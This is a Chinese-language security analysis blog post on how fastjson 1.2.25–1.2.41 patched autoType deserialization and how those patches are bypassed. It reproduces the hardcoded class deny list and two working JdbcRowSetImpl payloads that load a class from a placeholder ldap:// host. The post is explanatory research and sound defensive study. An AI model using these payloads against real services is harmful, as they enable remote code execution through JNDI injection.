前言
==

在了深入的了解和学习fasjson&lt;1.2.24的JdbcRowSetImpl、TemplatesImpl这两条调用链之后，展开对fastjson的后续补丁以及相关绕过的学习。  
下面分析使用JdbcRowSetImpl测试，TemplatesImpl链是一样的，因为补丁为了“治本”，是想直接不让加载调用链中使用的关键类，从而断绝这一系列的poc。

fastjson的1.2.25-1.2.41：
=======================

1.2.24：
-------

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-89a89ceb602e83c3268086d97fed82384c114e6b.png)

1.2.25：
-------

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-e89818e2535ef75a01334f991dc22b3e92557658.png)

可以看到在1.2.25里面在com.alibaba.fastjson.parser.DefaultJSONParser类parseObject()方法里面在获取class的时候，增加了调用其config属性（com.alibaba.fastjson.parser.parserConfig）的checkAutoType()函数过滤，干掉不让用的类，从而从根源上“打断”各个POC中的调用链。  
跟进checkAutoType函数：

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {  
        return null;  
 } else if (typeName.length() >= this.maxTypeNameLength) {  
        throw new JSONException("autoType is not support. " + typeName);  
 } else {  
        String className = typeName.replace('$', '.');  
 Class<?> clazz = null;  
 int i;  
 String accept;  
 if (this.autoTypeSupport || expectClass != null) {  
            for(i = 0; i < this.acceptList.length; ++i) {  
                accept = this.acceptList[i];  
 if (className.startsWith(accept)) {  
                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);  
 if (clazz != null) {  
                        return clazz;  
 }  
                }  
            }  

            for(i = 0; i < this.denyList.length; ++i) {  
                accept = this.denyList[i];  
 if (className.startsWith(accept) && TypeUtils.getClassFromMapping(typeName) == null) {  
                    throw new JSONException("autoType is not support. " + typeName);  
 }  
            }  
        }  

        if (clazz == null) {  
            clazz = TypeUtils.getClassFromMapping(typeName);  
 }  

        if (clazz == null) {  
            clazz = this.deserializers.findClass(typeName);  
 }  

        if (clazz != null) {  
            if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) {  
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());  
 } else {  
                return clazz;  
 }  
        } else {  
            if (!this.autoTypeSupport) {  
                for(i = 0; i < this.denyList.length; ++i) {  
                    accept = this.denyList[i];  
 if (className.startsWith(accept)) {  
                        throw new JSONException("autoType is not support. " + typeName);  
 }  
                }  

                for(i = 0; i < this.acceptList.length; ++i) {  
                    accept = this.acceptList[i];  
 if (className.startsWith(accept)) {  
                        if (clazz == null) {  
                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);  
 }  

                        if (expectClass != null && expectClass.isAssignableFrom(clazz)) {  
                            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());  
 }  

                        return clazz;  
 }  
                }  
            }  

            if (clazz == null) {  
                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);  
 }  

            if (clazz != null) {  
                if (TypeUtils.getAnnotation(clazz, JSONType.class) != null) {  
                    return clazz;  
 }  

                if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {  
                    throw new JSONException("autoType is not support. " + typeName);  
 }  

                if (expectClass != null) {  
                    if (expectClass.isAssignableFrom(clazz)) {  
                        return clazz;  
 }  

                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());  
 }  

                JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, this.propertyNamingStrategy);  
 if (beanInfo.creatorConstructor != null && this.autoTypeSupport) {  
                    throw new JSONException("autoType is not support. " + typeName);  
 }  
            }  

            if (!this.autoTypeSupport) {  
                throw new JSONException("autoType is not support. " + typeName);  
 } else {  
                return clazz;  
 }  
        }  
    }  
}
```

在该函数中有一个关键变量：`autoTypeSupport`，默认为false

1、先来看看autoTypeSupport为True时，该函数的处理逻辑以及绕过方法：
-------------------------------------------

### fastjson版本：1.2.41&gt;=fastjson&gt;=1.2.25

可以看到AutoTypeSupport属性为True的时候会进入到下面这个if判断中  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-7b1d6492e5c5abd709375afb721758e7471936e8.png)  
在该判断中先是使用了白名单匹配，如果匹配到了白名单就直接返回对应class，没有匹配到就继续向下进行黑名单匹配，如果匹配到了黑名单就直接抛出异常:不支持该类。  
白名单：是ParserConfig该类静态初始化模块中在从property配置文件里面取出来的，开发者可以配置。  
黑名单：写死在源码里面的：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-4e2cb85dc6be8ec0c8045709dd7b60a9c457c652.png)  
黑名单如下：

```php
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.apache.xalan
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

一共23个：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b2e51da4758dc6cc73d9706e7e7b1b7100aa47bb.png)  
如果`@type`参数指定的是以以上字符开头的类，都会抛出异常。

来看下常见的payload怎么绕过这种情况的把：  
测试使用poc类：  
使用**payload1**：

```java
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  

public class Fastjson125 {  
    public static void main(String[] args) {  
                /*  
 JdbcRowSetImpl调用链  
 */ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
 String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://XX.xx.xx.xxx:port/Evalclass\",\"autoCommit\":true}";  
 JSON.parse(payload);  
 }  
}
```

可以看到这里的payload中的类做了一点改变：`Lcom.sun.rowset.JdbcRowSetImpl;`,前面加了一个`L`后面加了一个`;`

将这个payload带进去，前面的白名单没有匹配上，黑名单也没匹配上，接下来再分析分析checkAutoType()函数，对于两种情况都没匹配上是怎样处置的：  
白黑名单出来完之后部分代码如下：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-cb2b58487c0727d8e689ba8a57ce600c8d29ac98.png)  
首先判断`autoTypeSupport`是否为false，如果不是false，可以看到会执行下面`TypeUtils.loadClass()`代码，调用`com.alibaba.fastjson.util.TypeUtils`类的loadClass()方法，并传入typeName为：**`Lcom.sun.rowset.JdbcRowSetImpl;`** 和一个为null的classLoader对象，跟进该方法：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-430127afa1a2c0d17739e9f93fec5dd61fc18d1c.png)

```java
public static Class<?> loadClass(String className, ClassLoader classLoader) {  
    if (className != null && className.length() != 0) {  
        Class<?> clazz = (Class)mappings.get(className);  
 if (clazz != null) {  
            return clazz;  
 } else if (className.charAt(0) == '[') {  
            Class<?> componentType = loadClass(className.substring(1), classLoader);  
 return Array.newInstance(componentType, 0).getClass();  
 } else if (className.startsWith("L") && className.endsWith(";")) {  
            String newClassName = className.substring(1, className.length() - 1);  
 return loadClass(newClassName, classLoader);  
 } else {  
            try {  
                if (classLoader != null) {  
                    clazz = classLoader.loadClass(className);  
 mappings.put(className, clazz);  
 return clazz;  
 }  
            } catch (Throwable var6) {  
                var6.printStackTrace();  
 }  

            try {  
                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();  
 if (contextClassLoader != null && contextClassLoader != classLoader) {  
                    clazz = contextClassLoader.loadClass(className);  
 mappings.put(className, clazz);  
 return clazz;  
 }  
            } catch (Throwable var5) {  
            }  

            try {  
                clazz = Class.forName(className);  
 mappings.put(className, clazz);  
 return clazz;  
 } catch (Throwable var4) {  
                return clazz;  
 }  
        }  
    } else {  
        return null;  
 }  
}
```

可以看到loadClass()方法中对特殊的typeName做了简单的处理：其中对开头为`L`，结尾为`;`的处理是：干掉`L`和`;`然后直接再重新调用loadClass()方法：当再次调用改方法的时候，不会被前面的相关格式匹配到，并且由于其传入的classLoader仍为null,从而会执行下面这些代码：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-9a6767237d8cf2e4e117a90aae3dc0e7b33ecf83.png)  
通过`Thread.currentThread().getContextClassLoader()`获取ClassLoader对象并直接调用其loadClass()方法加载出构造链中的`JdbcRowSetImpl`类并返回，回到checkAutoType()方法中发现只是简单对该类的源码是否存在做了判断之后就同样返回该类的class对象了，并未有后续处理：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c94011798fdbd76c2cb523949c2b0ffeea053ac6.png)  
再后来就是该类的正常调用链了，JdbcRowSetImpl的后续就是：fastjson反序列化中利用反射调用其属性的set方法，在其setAutoCommit()方法中会调用connect方法从而触发java中的**lookup()JDNI注入**

### fastjson&gt;=1.2.42

那为啥1.2.42之后就不行了呢，打了什么补丁？  
如图：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-4c889bdddd556b6f72a22b334280cd9f663d2721.png)  
fastjson 1.2.42中checkAutoType()函数里面刚进去就把开头为L，结尾为；的className干掉其首尾，所以之后的黑名单校验就过不去了！并且在1.2.42这个版本的补丁中为了防止黑名单外泄（感觉有点掩耳盗铃之意），对黑名单进行了hash。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-0e526b7b215aa40bf2be8b2e04a668b9ba086780.png)  
不出意外，扫一波就给全薅下来了：  
fastjson1.2.42系列之后使用hash方式的各版本的黑名单映射表：[黑名单类hash对应表](https://github.com/LeadroyaL/fastjson-blacklist#%E7%9B%AE%E5%89%8D%E7%9A%84%E5%88%97%E8%A1%A8)

2、当autoTypeSupport为false时，该函数的处理逻辑以及绕过方法：
-----------------------------------------

### 1.2.41&gt;=fastjson &gt;=1.2.25

回到1.2.25版本，该版本使用checkAutoType()函数进行过滤时，当`autoTypeSupport`为false，那么上面的白名单和黑名单过滤的if就进不去了，执行下面的：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-edc57ccfe97783fd25bfd8c895a4ee4dd1238130.png)  
可以看到首先执行的就是：  
`Class<?> clazz = TypeUtils.getClassFromMapping(typeName);`  
TypeUtils.getClassFromMapping（）方法：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-dff853bf46a8f607a506e2272a312d3fca0ecf17.png)  
在TypeUtils类里面维护着一个Map类mappings对象，里面存放着一些String和Class的映射关系：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3eeac1f0103245f5b7d4f84283e082f68d602665.png)  
**所以，当autoTypeSupport为false的时候，Class的获取首先是从这个缓存对象mappings里面拿来的。**  
换一句话说：那是不是只要将JdbcRowSetImpl类的Class提前写到该缓存里面，那我们就绕过了这个checkAutoType（）方法，返回调用链要使用的类了。

那顺着思路往下走，我们要去找对mappings对象进行操作的地方，Map对象一般使用put方法进行操作，查找TypeUtils类里面使用mappings.put方法使用：  
一共有两处：  
`private static void addBaseClassMappings()`  
`public static Class<?> loadClass(String className, ClassLoader classLoader)`  
loadClass（）这个方法在本文章前半部分autoTypeSupport为True的时候遇到过，不妨先看看：  
在该方法里面有两处调用mappings.put，往mappings里面放入了String，Class键值对：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-d49f4aee7de4cdf2e57a8d09b8862467518e3214.png)  
（1、其中1处的条件是调用该方法的时候，传入了一个非空的ClassLoader对象  
（2、其中第2处则是上文中提到的地方，调用`Thread.currentThread().getContextClassLoader()`方法获取ClassLoader对象，然后调用loadClass方法获取传入的String className值的Class，并将其放入mappings中，然后返回。  
看样子显然第二处是我们想要找的，那我们可以去找找哪里调用了这个TypeUtils类的loadClass方法，并且其传入的String类型的className参数为`com.sun.rowset.JdbcRowSetImpl`！  
反向分析的差不多了，接下来正向分析一波，毕竟这种东西不是那么好找出来的：

在fastjson反序列化使用@type指定java.lang.Class类对象并对其val置值为`com.sun.rowset.JdbcRowSetImpl`的时候：  
和正常一样首先使用DefaultJSONParser类的parserObject方法对其进行处理：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3b8813151c94df2f007383547eb8849fd5d1affd.png)  
紧接着就是checkAutoType()函数：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-bcca5d61af676e9209f94c21b37e1adb66f0fe3c.png)  
`java.lang.Class`该类不在黑名单类里面，不会被阻拦，继续向下运行：触发`this.config.getDeserializer.deserialze(this, clazz, fieldName) `执行：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-8c0b1026702f5f7381bc5bb6421590acb6135888.png)  
跟进deserialze()方法:  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-19df202857dc25a71e578753ba7f092fb889da6b.png)  
在该方法中将val的值赋给了objval对象：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-23a615fc382e1635a0ca380f0581bc54306a58f8.png)  
之后就是对出入的参数class进行匹配，我们传入的是java.lang.Class，从而进入下面的else if：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ff7360d74b6d6f97ee1899f0eae59f191a8a9ba0.png)  
继续向下可以看到对Class类型做了一个匹配，进入Class.class的if中：  
执行了`TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());`并且其传入的className形参strVal的值为调用链中要用的`com.sun.rowset.JdbcRowSetImpl`，同时传入其默认的classLoader，默认null为空。从而正好满足了我们反向分析时候的要求，将调用链中用到的JdbcRowSetImpl类置入mappings中！  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3e5e69bf63908f5da742b432bd8b4c9c6dfe5258.png)  
**原理剖析完了，那payload怎么构造呢？**  
答：使用@type指定对应的类，传入一个json“即可”：  
使用**payload2**：

```java
String payloadforall ="{\n" +  
        " \"a\":{\n" +  
        " \"@type\":\"java.lang.Class\",\n" +  
        " \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +  
        "    },\n" +  
        " \"b\":{\n" +  
        " \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +  
        " \"dataSourceName\":\"ldap://xxx.xxx.xxx.xxx:port/Evalclass\",\n" +  
        " \"autoCommit\":true\n" +  
        "    }\n" +  
        "}";
```

这里有一个细节：一定要把指定java.lang.Class的那个反正前面，我们需要先利用java.lang.Class类来添加mappings缓存中的调用链类映射关系，然后再使用常规的调用链条payload。

总结：
---

1、autoTypeSupport为True时：  
当`autoTypeSupport`为True时，`CheckAutoType()`方法中看似先使用白名单然后使用黑名单进行过滤，其实不然，对里面的逻辑进行分析之后，其实这里就是使用的黑名单的过滤方法，此时我们通过构造特殊（前面加`L`，后面加`;`）的类名成功绕过黑名单的过滤，并通过后续其工具类TypeUtil类的loadClass()方法还原出调用链中使用的类（JdbcRowSetImpl、TemplatesImpl）

2、autoTypeSupport为false时：  
当`autoTypeSupport`为False时，`CheckAutoType()`方法中，首先是去TypeUtils的Map类型的缓存对象mapppings里面找其String，Class映射关系，从而获取其Class。利用这一点，如果提前构造好调用链中的JdbcRowSetImpl或者TemplatesImpl类进入其缓存对象，那么再调用`CheckAutoType()`时就会正常返回我们想要的以上类。而java.lang.Class在fastjson反序列化时，调用其TypeUtil的`this.config.getDeserializer.deserialze(this, clazz, fieldName)`方法并在其中调用loadClass加载出payload中构造的val属性对应的类Class，并将其put进mappings中。所以当下次执行checkAutoType()方法时就能利用mappings进行绕过。

其他：
---

1、还有一个细节：在第二种第二种情况，也就是autoTypeSupport为false的时候，他的payload同样试用于autoTypeSupport为Ture的“部分情况”：  
当fastjson版本为1.2.32-1.2.41的时候。  
我们不妨来看一下其checkAutoType()函数有何不同：  
1.2.25-1.2.31：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1a1bbf7e832d1b17ca21052827dd5f1515cd0047.png)  
1.2.32-1.2.41：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-aff336d6e51f1845dc4e56dd09ff7864ae3354f2.png)  
可以看到这两个的区别就在于，在进行黑名单过滤的时候，**当我们匹配到一个黑名单上的类的时候，去不去判断其是否存在mappings缓存**  
1.2.25-1.2.31中没有考虑缓存，从而我们构造的payload不能绕过。  
1.2.32-1.2.41中考虑了缓存mappings，及时匹配到了黑名单，也不会直接抛出异常，而是进一步的判断是否存在缓存mappings，如果有，那么就不抛出异常，继续向下执行从而触发调用链。  
**简而言之理解就是：1.2.25-1.2.31中缓存的优先级比黑名单低，1.2.32-1.2.41中缓存的优先级比黑名单高。**

绕过情况：
-----

fastjson 1.2.25-1.2.41 试用情况，其中JdbcRowSetImpl链可替换成TemplatesImpl链：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-8f36c4e3ba7932bb9f21d7f2d236955a58c19ebb.png)

2、说来惭愧作为一名安全分析工程师，到今天终于明白了：很多客户那边上的漏扫，扫的流量大部分都是payload2。因为payload2的“兼容性高”，同时本文才分析到fastjson 1.2.41，其实不然，payload2还兼容后面很多个版本，具体的话且看我的下一篇文章《白话分析之 fastjson 全系列bypass分析（二）》

参考文章：
=====

<https://xz.aliyun.com/t/9052#toc-0>  
<http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#V1-2-42>